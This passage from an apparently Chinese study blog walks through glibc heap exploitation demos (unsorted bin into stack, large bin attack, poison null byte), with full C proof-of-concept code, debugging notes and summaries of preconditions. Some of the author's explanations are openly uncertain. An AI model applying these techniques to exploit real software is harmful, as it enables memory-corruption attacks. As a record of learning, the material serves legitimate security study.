<li>首先是在unsorted bin中放入一个chunk，修改这个chunk的bk为 想要写值的地址-0x10</li>
<li>然后把这个unsorted bin申请回来</li>
</ol>
<h1 id="0x08-unsorted-bin-into-stack"><a href="#0x08-unsorted-bin-into-stack" class="headerlink" title="0x08 unsorted bin into stack"></a>0x08 unsorted bin into stack</h1><p>这个就是通过unsorted bin里的chunk的bk来达到在将chunk申请到栈上的效果</p>
<h2 id="源代码-8"><a href="#源代码-8" class="headerlink" title="源代码"></a>源代码</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">intptr_t</span> stack_buffer[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Allocating the victim chunk\n&quot;</span>);</span><br><span class="line">	<span class="keyword">intptr_t</span>* victim = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Allocating another chunk to avoid consolidating the top chunk with the small one during the free()\n&quot;</span>);</span><br><span class="line">	<span class="keyword">intptr_t</span>* p1 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Freeing the chunk %p, it will be inserted in the unsorted bin\n&quot;</span>, victim);</span><br><span class="line">	<span class="built_in">free</span>(victim);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在栈上伪造一个chunk</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Create a fake chunk on the stack&quot;</span>);</span><br><span class="line">    <span class="comment">// 设置下一次分配的大小并且把bk指针指向任意可写地址</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Set size for next allocation and the bk pointer to any writable address&quot;</span>);</span><br><span class="line">	stack_buffer[<span class="number">1</span>] = <span class="number">0x100</span> + <span class="number">0x10</span>;</span><br><span class="line">	stack_buffer[<span class="number">3</span>] = (<span class="keyword">intptr_t</span>)stack_buffer;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line">    <span class="comment">// 现在假设我们有一个漏洞可以让我们覆写victim-&gt;size和victim-&gt;bk指针</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;size and victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line">    <span class="comment">// size必须和下一个请求的size不同以返回一个fake_chunk并且需要bypass 2*SIZE_SZ&gt;16 &amp;&amp; 2*SIZE&lt;av-&gt;system-&gt;mem 的检查</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Size should be different from the next request size to return fake_chunk and need to pass the check 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem\n&quot;</span>);</span><br><span class="line">	victim[<span class="number">-1</span>] = <span class="number">32</span>;</span><br><span class="line">	victim[<span class="number">1</span>] = (<span class="keyword">intptr_t</span>)stack_buffer; <span class="comment">// victim-&gt;bk is pointing to stack</span></span><br><span class="line">	<span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 现在我们就可以返回我们的fake_chunk了</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now next malloc will return the region of our fake chunk: %p\n&quot;</span>, &amp;stack_buffer[<span class="number">2</span>]);</span><br><span class="line">	<span class="keyword">char</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;malloc(0x100): %p\n&quot;</span>, p2);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="运行结果及调试-7"><a href="#运行结果及调试-7" class="headerlink" title="运行结果及调试"></a>运行结果及调试</h2><p>依旧是断在了malloc完的情况，但是我这里不知道为什么多了一个0x411的chunk，这里我们直接忽略它就行</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13513481257/0" alt="image-20210511165058888"></p>
<p>此时我们free掉了victim</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13513486486/0" alt="image-20210511165202470"></p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13513497857/0" alt="image-20210511165418590"></p>
<p>此时我们在栈上伪造了一个chunk</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13513533507/0" alt="image-20210511170116006"></p>
<p>然后我们修改了victim的size和它的bk，bk改成了我们伪造的chunk，size这里只要改小就行，这是为什么呢？</p>
<p>此时我们依旧修改了victim的bk，本来unsorted bin中只有一个chunk，但是我们修改了它的bk后，它就被误以为有两个chunk，也就是我们的fake_chunk被系统认为链入到了unsorted bin中，但是unsorted bin是先进先出的，所以是从0x20的开始取，但是大小不够，所以会将0x20的放入small bin中(符合small  bin大小)，然后从下一个也就是我们伪造的fake chunk去取，此时就符合</p>
<p>但是这里有个疑问就是unsorted bin中不是一个chunk的话，应该是会把所有chunk都放入适合大小的bin后在从bin中去取，比如我认为这里应该都会放入small bin中，而不是只有0x20的放入，但是我调试看似乎只有它放了，我也不知道为什么</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13513650097/0" alt="image-20210511171915008"></p>
<h2 id="总结-8"><a href="#总结-8" class="headerlink" title="总结"></a>总结</h2><p>程序先是在栈上定义了一个数组</p>
<p>随即分配了两个大小为0x100的chunk vitcim和chunk p1</p>
<p>紧接着释放了victim把他放进了unsorted bin中，之后在栈上伪造了一个fake chunk</p>
<p>最后修改了victim的Size和bk指针，将我们的fake chunk链入我们的unsorted bin中</p>
<p>此时我们再malloc一个合适大小的chunk就可以在我们的栈上malloc出来了</p>
<p>条件：</p>
<ol>
<li>两个chunk，其中一个只是防止与top chunk合并</li>
<li>一个放入victim中，修改size，修改bk为fake_chunk</li>
<li>栈上伪造一个chunk</li>
<li>malloc一个适合的chunk</li>
</ol>
<h1 id="0x09-large-bin-attack"><a href="#0x09-large-bin-attack" class="headerlink" title="0x09 large bin attack"></a>0x09 large bin attack</h1><h2 id="源代码-9"><a href="#源代码-9" class="headerlink" title="源代码"></a>源代码</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 本例以通过写一个大的无符号long型数值进入栈来演示large bin attack</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This file demonstrates large bin attack by writing a large unsigned long value into stack\n&quot;</span>);</span><br><span class="line">    <span class="comment">// 在实际中，large bin attack也常常被用于更深层次的攻击，如覆写global_max_fast来为fastbin attack打辅助(为什么有一种看到了unsorted bin attack的错觉2333</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;In practice, large bin attack is generally prepared for further attacks, such as rewriting the &quot;</span></span><br><span class="line">           <span class="string">&quot;global variable global_max_fast in libc for further fastbin attack\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 我们要在栈上覆写的是stack_var1和stack_var2</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var1 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Let&#x27;s first look at the targets we want to rewrite on stack:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var1 (%p): %ld\n&quot;</span>, &amp;stack_var1, stack_var1);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var2 (%p): %ld\n\n&quot;</span>, &amp;stack_var2, stack_var2);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 现在我们有了第一个large chunk</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x320</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we allocate the first large chunk on the heap at: %p\n&quot;</span>, p1 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with&quot;</span></span><br><span class="line">           <span class="string">&quot; the first large chunk during the free()\n\n&quot;</span>);</span><br><span class="line">    <span class="comment">// 然后申请一个fastbin chunk 来避免我们的第一个large chunk free的时候与下一个large chunk合并</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//现在是第二个large chunk</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Then, we allocate the second large chunk on the heap at: %p\n&quot;</span>, p2 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//同理,防止第二个free的时候与下一个large chunk合并</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with&quot;</span></span><br><span class="line">           <span class="string">&quot; the second large chunk during the free()\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 最后我们分配第三个large chunk</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Finally, we allocate the third large chunk on the heap at: %p\n&quot;</span>, p3 - <span class="number">2</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And allocate another fastbin chunk in order to avoid consolidating the top chunk with&quot;</span></span><br><span class="line">           <span class="string">&quot; the third large chunk during the free()\n\n&quot;</span>);</span><br><span class="line">    <span class="comment">// 这个fastbin是为了防止和top chunk合并</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line">    <span class="comment">// 现在我们free掉第一个和第二个large chunks,此时他们会被插入到unsorted bin中</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;We free the first and second large chunks now and they will be inserted in the unsorted bin:&quot;</span></span><br><span class="line">           <span class="string">&quot; [ %p &lt;--&gt; %p ]\n\n&quot;</span>, (<span class="keyword">void</span> *)(p2 - <span class="number">2</span>), (<span class="keyword">void</span> *)(p2[<span class="number">0</span>]));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="comment">// 此时,我们申请一个小于被释放的第一个large chunk的chunk</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the&quot;</span></span><br><span class="line">            <span class="string">&quot; freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation&quot;</span></span><br><span class="line">            <span class="string">&quot;, and reinsert the remaining of the freed first large chunk into the unsorted bin:&quot;</span></span><br><span class="line">            <span class="string">&quot; [ %p ]\n\n&quot;</span>, (<span class="keyword">void</span> *)((<span class="keyword">char</span> *)p1 + <span class="number">0x90</span>));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(p3);</span><br><span class="line">    <span class="comment">// 现在我们free第三个large chunk</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we free the third large chunk and it will be inserted in the unsorted bin:&quot;</span></span><br><span class="line">           <span class="string">&quot; [ %p &lt;--&gt; %p ]\n\n&quot;</span>, (<span class="keyword">void</span> *)(p3 - <span class="number">2</span>), (<span class="keyword">void</span> *)(p3[<span class="number">0</span>]));</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 现在假设我们有一个漏洞可以覆写被free的第二个large chunk的size,bk,bk_nextsize指针</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now emulating a vulnerability that can overwrite the freed second large chunk&#x27;s \&quot;size\&quot;&quot;</span></span><br><span class="line">            <span class="string">&quot; as well as its \&quot;bk\&quot; and \&quot;bk_nextsize\&quot; pointers\n&quot;</span>);</span><br><span class="line">    <span class="comment">// 现在我们减少被free的第二个large chunk来逼迫malloc将被free的第三个large chunk插入到large bin freelist的头部</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk&quot;</span></span><br><span class="line">    <span class="comment">// 为了覆写栈上的值,我们将在stack_var1前将bk设位16bytes,并在stack_var2前将bk_nextsize设为32bytes        </span></span><br><span class="line">            <span class="string">&quot; at the head of the large bin freelist. To overwrite the stack variables, we set \&quot;bk\&quot; to 16 bytes before stack_var1 and&quot;</span></span><br><span class="line">            <span class="string">&quot; \&quot;bk_nextsize\&quot; to 32 bytes before stack_var2\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    p2[<span class="number">-1</span>] = <span class="number">0x3f1</span>;</span><br><span class="line">    p2[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    p2[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">    p2[<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var1 - <span class="number">2</span>);</span><br><span class="line">    p2[<span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var2 - <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 让我们再malloc一次,这样被释放的large chunk就被插入到large bin freelist了</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Let&#x27;s malloc again, so the freed third large chunk being inserted into the large bin freelist.&quot;</span></span><br><span class="line">    <span class="comment">//在这期间,我们的目标已经被改写        </span></span><br><span class="line">            <span class="string">&quot; During this time, targets should have already been rewritten:\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var1 (%p): %p\n&quot;</span>, &amp;stack_var1, (<span class="keyword">void</span> *)stack_var1);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var2 (%p): %p\n&quot;</span>, &amp;stack_var2, (<span class="keyword">void</span> *)stack_var2);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// sanity check</span></span><br><span class="line">    assert(stack_var1 != <span class="number">0</span>);</span><br><span class="line">    assert(stack_var2 != <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="运行结果及调试-8"><a href="#运行结果及调试-8" class="headerlink" title="运行结果及调试"></a>运行结果及调试</h2><p>分配完六个chunk后的堆块结构</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13514630352/0" alt="image-20210511210104490"></p>
<p>释放了p1和p2之后</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13514634416/0" alt="image-20210511210205159"></p>
<p>此时我们再申请一个小的chunk，就会把第二个free的chunk放入large bin中</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13514656787/0" alt="image-20210511210746116"></p>
<p>并且发现我们的unsorted bin中的chunk是经过切割的</p>
<p>经过调试发现其实在申请小的chunk的时候，会将这两个chunk都放入large bin中(符合large bin大小)，然后去large bin中去取合适的chunk，此时合适的chunk就是第一个free掉的，将其切割后，剩余的就会进入到unsorted bin中，就会变成上面这样。</p>
<p>此时我们再free掉p3</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13514693470/0" alt="image-20210511211912928"></p>
<p>可以看到p3也进入了unsorted bin中，我们开始伪造p2</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13514702324/0" alt="image-20210511212136686"></p>
<p>我们先修改了p2的size为0x3f1，然后fd为0，fd-&gt;nextsize为0，bk为&amp;stack_var1 - 2，而bk-&gt;nextsize为&amp;stack_var2-4</p>
<p><img src="https://inews.gtimg.com/newsapp_ls/0/13514819900/0" alt="image-20210511215816634"></p>
<p>可以看到此时我们已经修改了stack_var1和stack_var2</p>
<h2 id="总结-9"><a href="#总结-9" class="headerlink" title="总结"></a>总结</h2><p>本例中,程序先是在栈上创建了两个变量stack_var1和stack_var2并赋初值为0,这两个变量就是即将要被覆写的变量</p>
<p>随后申请了一个large chunk p1,然后又申请了一个小chunk来避免后面的操作引发合并,之后又申请了一个large chunk p2,之后还是一个避免合并的小chunk,下面申请p3的操作类似</p>
<p>随后程序释放了p1,p2,此时两个chunk被链入unsorted bin中</p>
<p>之后为了将p2放入large bin,程序又申请了一个小chunk对p1进行切割,一部分还给用户,一部分继续放进unsorted bin中,然后系统将p2放入了large bin中</p>
<p>之后Free掉了p3,现在p3也在unsorted bin中</p>
<p>好了,现在程序伪造了p2的内容,将p2-&gt;bk_nextsize指向stack2-4,p2-&gt;bk指向stack1-2</p>
<p>再malloc一个小chunk,这个时候程序就会将p3放入large bin中,系统就会调用从unsorted bin中取出large bin的操作,将堆地址存入栈上的地址</p>
<p>条件：</p>
<ol>
<li>先想办法将放入一个chunk到large bin中</li>
<li>unsorted bin中有两个chunk，这样可以触发将一个chunk放入large bin(当然要满足large bin的大小)</li>
<li>此时malloc的时候就会将unsorted bin中的chunk放入到large bin中，放入large bin就会触发它的排序，所以排序就会试我们的攻击成功？</li>
<li>这里需要改大小，不改程序就会崩，改大了stack1就没改，不知道为什么后面再调调看吧</li>
</ol>
<h1 id="0x10-poison-null-bytes"><a href="#0x10-poison-null-bytes" class="headerlink" title="0x10 poison null bytes"></a>0x10 poison null bytes</h1><p>这种攻击方式需要在没有tcache上进行</p>
<h2 id="源代码-10"><a href="#源代码-10" class="headerlink" title="源代码"></a>源代码</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">uint8_t</span>* a;</span><br><span class="line">	<span class="keyword">uint8_t</span>* b;</span><br><span class="line">	<span class="keyword">uint8_t</span>* c;</span><br><span class="line">	<span class="keyword">uint8_t</span>* b1;</span><br><span class="line">	<span class="keyword">uint8_t</span>* b2;</span><br><span class="line">	<span class="keyword">uint8_t</span>* d;</span><br><span class="line">	<span class="keyword">void</span> *barrier;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We allocate 0x100 bytes for &#x27;a&#x27;.\n&quot;</span>);</span><br><span class="line">	a = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;a: %p\n&quot;</span>, a);</span><br><span class="line">	<span class="keyword">int</span> real_a_size = malloc_usable_size(a);</span><br><span class="line">    <span class="comment">// 我们想溢出&#x27;a&#x27;的话，我们需要知道&#x27;a&#x27;的真实大小，因为舍入，&#x27;a&#x27;可能比0x100更大(我觉得这个舍入就是加了size,presize然后空间复用了一下</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Since we want to overflow &#x27;a&#x27;, we need to know the &#x27;real&#x27; size of &#x27;a&#x27; &quot;</span></span><br><span class="line">		<span class="string">&quot;(it may be more than 0x100 because of rounding): %#x\n&quot;</span>, real_a_size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// chunk size属性的最小有效字节不能是0x00，最小的也必须是0x10，因为chunk的size包括请求的量加上元数据所需的大小(也就是我们的size和pre_size然后空间复用</span></span><br><span class="line">	<span class="comment">/* chunk size attribute cannot have a least significant byte with a value of 0x00.</span></span><br><span class="line"><span class="comment">	 * the least significant byte of this will be 0x10, because the size of the chunk includes</span></span><br><span class="line"><span class="comment">	 * the amount requested plus some amount required for the metadata. */</span></span><br><span class="line">	b = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;b: %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">	c = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;c: %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">	barrier =  <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="comment">// c我们分配了barrier,这样我们free c的时候就不会被合并到top chunk里了,这个burrier并不是必须的,只不过是为了减少可能产生的问题</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We allocate a barrier at %p, so that c is not consolidated with the top-chunk when freed.\n&quot;</span></span><br><span class="line">		<span class="string">&quot;The barrier is not strictly necessary, but makes things less confusing\n&quot;</span>, barrier);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">uint64_t</span>* b_size_ptr = (<span class="keyword">uint64_t</span>*)(b - <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在新版本的glibc中添加了新的check即: size==prev_next(next_chunk)</span></span><br><span class="line">	<span class="comment">// added fix for size==prev_size(next_chunk) check in newer versions of glibc</span></span><br><span class="line">	<span class="comment">// https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30</span></span><br><span class="line">	<span class="comment">// 这个被新增的check要求我们允许b中有null指针而不仅仅是c   </span></span><br><span class="line">    <span class="comment">// this added check requires we are allowed to have null pointers in b (not just a c string)</span></span><br><span class="line">	<span class="comment">//*(size_t*)(b+0x1f0) = 0x200;</span></span><br><span class="line">    <span class="comment">// 在新版本的glibc中我们需要让我们更新的size包含b自身去pass &#x27;chunksize(P)!=prev_size(next_chunk(P))&#x27;</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;In newer versions of glibc we will need to have our updated size inside b itself to pass &quot;</span></span><br><span class="line">		<span class="string">&quot;the check &#x27;chunksize(P) != prev_size (next_chunk(P))&#x27;\n&quot;</span>);</span><br><span class="line">	<span class="comment">// 我们将此位置设为0x200,因为0x200==(0x211&amp;0xff00)</span></span><br><span class="line">    <span class="comment">// we set this location to 0x200 since 0x200 == (0x211 &amp; 0xff00)</span></span><br><span class="line">    <span class="comment">// 这个是b.size的值在被null字节覆盖之后的值  </span></span><br><span class="line">    <span class="comment">// which is the value of b.size after its first byte has been overwritten with a NULL byte</span></span><br><span class="line">	*(<span class="keyword">size_t</span>*)(b+<span class="number">0x1f0</span>) = <span class="number">0x200</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 这个技术通过覆盖一个free chunk的元数据来生效</span></span><br><span class="line">	<span class="comment">// this technique works by overwriting the size metadata of a free chunk</span></span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;b.size: %#lx\n&quot;</span>, *b_size_ptr);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;b.size is: (0x200 + 0x10) | prev_in_use\n&quot;</span>);</span><br><span class="line">    <span class="comment">// 我们通过用一个null字节来溢出a来修改b的元数据</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We overflow &#x27;a&#x27; with a single null byte into the metadata of &#x27;b&#x27;\n&quot;</span>);</span><br><span class="line">	a[real_a_size] = <span class="number">0</span>; <span class="comment">// &lt;--- THIS IS THE &quot;EXPLOITED BUG&quot;</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;b.size: %#lx\n&quot;</span>, *b_size_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">uint64_t</span>* c_prev_size_ptr = ((<span class="keyword">uint64_t</span>*)c)<span class="number">-2</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;c.prev_size is %#lx\n&quot;</span>,*c_prev_size_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//这个malloc将会在b上调用unlink</span></span><br><span class="line">     <span class="comment">// This malloc will result in a call to unlink on the chunk where b was.   </span></span><br><span class="line">     <span class="comment">//新增的chunk,如果没有像之前那样被正确处理,就会检测堆是否被损坏了                                  </span></span><br><span class="line">     <span class="comment">// The added check (commit id: 17f487b), if not properly handled as we did before,                       </span></span><br><span class="line">     <span class="comment">// will detect the heap corruption now.                            </span></span><br><span class="line">     <span class="comment">// The check is this: chunksize(P) != prev_size (next_chunk(P)) where                                </span></span><br><span class="line">     <span class="comment">// P == b-0x10, chunksize(P) == *(b-0x10+0x8) == 0x200 (was 0x210 before the overflow)               </span></span><br><span class="line">     <span class="comment">// next_chunk(P) == b-0x10+0x200 == b+0x1f0</span></span><br><span class="line">     <span class="comment">// prev_size (next_chunk(P)) == *(b+0x1f0) == 0x200</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We will pass the check since chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))\n&quot;</span>,</span><br><span class="line">		*((<span class="keyword">size_t</span>*)(b<span class="number">-0x8</span>)), *(<span class="keyword">size_t</span>*)(b<span class="number">-0x10</span> + *((<span class="keyword">size_t</span>*)(b<span class="number">-0x8</span>))));</span><br><span class="line">	b1 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;b1: %p\n&quot;</span>,b1);</span><br><span class="line">    <span class="comment">// 现在我们malloc b1,他将会被放在b的地方,此时,c的prev_size将会被更新</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now we malloc &#x27;b1&#x27;. It will be placed where &#x27;b&#x27; was. &quot;</span></span><br><span class="line">		<span class="string">&quot;At this point c.prev_size should have been updated, but it was not: %#lx\n&quot;</span>,*c_prev_size_ptr);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Interestingly, the updated value of c.prev_size has been written 0x10 bytes &quot;</span></span><br><span class="line">		<span class="string">&quot;before c.prev_size: %lx\n&quot;</span>,*(((<span class="keyword">uint64_t</span>*)c)<span class="number">-4</span>));</span><br><span class="line">	<span class="comment">// 我们malloc b2作为我们的攻击目标</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;We malloc &#x27;b2&#x27;, our &#x27;victim&#x27; chunk.\n&quot;</span>);</span><br><span class="line">	<span class="comment">// Typically b2 (the victim) will be a structure with valuable pointers that we want to control</span></span><br><span class="line"></span><br><span class="line">	b2 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;b2: %p\n&quot;</span>,b2);</span><br><span 